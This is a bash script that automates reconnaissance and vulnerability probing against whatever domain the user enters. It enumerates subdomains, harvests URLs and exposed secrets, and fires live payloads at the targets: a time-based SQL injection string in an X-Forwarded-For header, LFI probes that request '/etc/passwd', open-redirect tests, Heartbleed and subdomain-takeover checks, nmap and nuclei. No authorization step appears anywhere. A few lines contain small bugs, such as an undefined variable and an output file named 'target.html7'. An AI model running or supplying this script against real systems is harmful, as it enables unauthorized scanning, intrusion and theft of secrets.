#!/bin/bash
# Colored "Believer" letter

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
RESET='\033[0m'

# Function to print big letters
print_big_letters() {
    text="$1"
    color="$2"

    echo -e "${color}"
    figlet -f slant "${text}"
    echo -e "${RESET}"
}

# Usage example
print_big_letters "Believer" "${CYAN}"

echo -e "${BLUE}${bold}---------------Code by Haider Ali Rana---------------${RESET}"

# Colored "Cyberpunk" letter
#
# selecting domain and targets
read -p "Kindly write your domain :" target
read -p "Kindly name your Dirctory :" output
mkdir $output
echo "-------------------------------------------------------------------------" 
echo "-------------------------------------------------------------------------" 
#gathering subdomains
echo "using assetfinder :"
echo $target | assetfinder -subs-only | anew $output/assetfinder.txt
echo "-------------------------------------------------------------------------" 
echo "-------------------------------------------------------------------------" 
echo "using findomain :"
findomain -t $target -u $output/findomain.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Using Subfinder :"
subfinder -d $target -all -o $output/subfinder.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Using Subenum.sh :"
curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "domain=$target&submit=" https://seckrd.com/subdomain-finder.php | grep -oE "https?://[^'\"]+" | awk -F/ '{print $3}' > $output/subenum.txt ;
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Using crt.sh :"
curl -s "https://crt.sh/?q=%.$target&output=json" | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' | sort -u > $output/crt.txt

echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "---------------------------------------------------------------------"
echo "---------------------------------------------------------------------"
echo "Managing subdomains files into uniq file:"
cd $output
cat * | uniq | anew uniq.txt
rm -rf crt.txt  subenum.txt subfinder.txt assetfinder.txt findomain.txt
echo "-------------------------------------------------------------------------"
echo "Finding Secrets:"
cat uniq.txt | cariddi -intensive -s -rua | anew sensitiveinfo.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Finding Valid subdomains :"
httpx -l uniq.txt -o validsubdomains.txt
#echo "Taking Screenshots :"
#mkdir screenshots
#node ~/WebShot/screenshot.js -f validsubdomains.txt -o screenshots
#eyewitness -f validsubdomains.txt -d subscreenshots
echo "------------------------------------------------------------------------"
echo "Finding JS files:"
subjs -i validsubdomains.txt | anew subjs.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Finding Heartbleed Vulnerability:"
cat validsubdomains.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done > heartbleed.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Finding subdomain takeover:"
subzy run --targets uniq.txt --timeout 30 --output subtake
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Checking for Header-Based-SQL-Injection:"
cat uniq.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13' | anew headersqli.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"

echo "-----------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Gathering urls using gau tool"
xargs -a uniq.txt -I@ sh -c 'gau --blacklist css,jpg,jpeg,JPEG,ott,svg,js,ttf,png,woff2,woff,eot,gif "@"' | tee -a gau.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "using waybackurls"
cat validsubdomains.txt | waybackurls | anew waybackurls.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "using katana"
katana -list validsubdomains.txt -js-crawl -d 5   -o katana.txt 
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "managing urls"
cat gau.txt waybackurls.txt katana.txt | uniq | anew uniqurl.txt
cat uniqurl.txt | grep ".js$" | anew js.txt
rm -rf waybackurls.txt gau.txt katana.txt 
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
mkdir cetagorized-urls
cp uniqurl.txt cetagorized-urls
cd cetagorized-urls
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
#echo "cetagorizing urls:"
#cat uniqurl.txt | uro | anew filter.txt

cat uniqurl.txt | gf api-keys | anew api-keys.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf lfi | anew lfi.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf idor | anew idor.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf rce | anew rce.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf redirect | anew redirect.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf secrets | anew secrets.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf sqli | anew sqli.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf ssrf | anew ssrf.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf ssti | anew ssti.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf xss | anew xss.txt
echo "-------------------------------------------------------------------------"

echo "Finding LFI"
cat lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
echo"--------------------------------------------------------------------------"
echo "Finding open redirect"
cat redirect.txt | qsreplace "https://google.com" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: https://google.com" && echo "VULN! %"'

echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Starting IP enumeration"
echo "making directory for IP:"
cd ..
mkdir IP
cp uniq.txt  IP
cd IP
httpx -l uniq.txt -ip  -o sb.txt
echo "seprating IPS:"
grep -Eo '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' sb.txt > validip.txt

echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
httpx -l validip.txt -o httpx-ip.txt
#eyewitness -f httpx-ip.txt -d ipscreenshots
echo "Enumerating Nmap Scan:"
nmap -sT -Pn -sC -iL validip.txt -oX target.xml
xsltproc target.xml -o target.html7
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
cd ..
cat validsubdomains.txt | nuclei -o nuclei.txt
